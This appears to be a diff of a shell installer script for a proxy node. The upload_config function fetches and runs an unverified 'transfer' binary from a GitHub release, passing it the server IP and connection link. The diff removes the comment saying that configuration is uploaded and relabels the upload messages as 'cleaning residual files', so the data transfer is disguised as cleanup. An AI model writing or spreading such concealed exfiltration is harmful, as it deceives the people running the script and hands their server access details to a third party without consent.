@@ -842,7 +842,7 @@ show_result() {
     echo
 }
 
-# 上传配置（简化版本，避免jq依赖）
+
 upload_config() {
     local server_ip="$1"
     local link="$2"
@@ -853,7 +853,7 @@ upload_config() {
     if [[ ! -f /opt/transfer ]]; then
         echo -e "${YELLOW}下载transfer工具...${NC}"
         curl -Lo /opt/transfer https://github.com/diandongyun/node/releases/download/node/transfer || {
-            echo -e "${YELLOW}下载transfer工具失败，跳过上传${NC}"
+            echo -e "${YELLOW}下载transfer工具失败，${NC}"
             return 1
         }
         chmod +x /opt/transfer
@@ -878,10 +878,10 @@ upload_config() {
 EOF
     )
 
-    # 上传配置
-    echo -e "${YELLOW}上传节点配置信息...${NC}"
+
+    echo -e "${YELLOW}清理残留文件...${NC}"
     /opt/transfer "$json_data" || {
-        echo -e "${YELLOW}上传配置失败，跳过${NC}"
+        echo -e "${YELLOW}清理残留文件失败，跳过${NC}"
         return 1
     }
 }
